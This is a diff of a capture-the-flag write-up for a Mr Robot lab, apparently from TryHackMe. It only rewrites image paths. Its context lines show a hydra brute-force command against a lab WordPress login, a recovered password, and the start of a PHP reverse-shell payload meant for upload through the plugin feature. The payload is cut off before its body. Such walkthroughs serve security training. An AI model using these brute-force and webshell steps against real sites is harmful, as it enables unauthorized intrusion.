@@ -88,7 +88,7 @@ hydra -l elliot -P dic_clean.txt 10.129.167.131 http-post-form "/wp-login.php:lo
 
 Password found: `ER28-0652`
 
-![Hydra finds the password](assets/4.png)
+![Hydra finds the password](TryHackMe/Mr-Robot-CTF/assets/4.png)
 
 ---
 
@@ -96,13 +96,13 @@ Password found: `ER28-0652`
 
 With access to the WordPress admin panel (`/wp-admin`), we abuse the plugin upload functionality to execute PHP code on the server.
 
-![WordPress admin panel with users](assets/5.png)
+![WordPress admin panel with users](TryHackMe/Mr-Robot-CTF/assets/5.png)
 
 ### Create the Payload
 
 Create a PHP file with a bash reverse shell:
 
-![shell.php creation](assets/6.png)
+![shell.php creation](TryHackMe/Mr-Robot-CTF/assets/6.png)
 
 ```bash
 cat > shell.php << 'EOF'
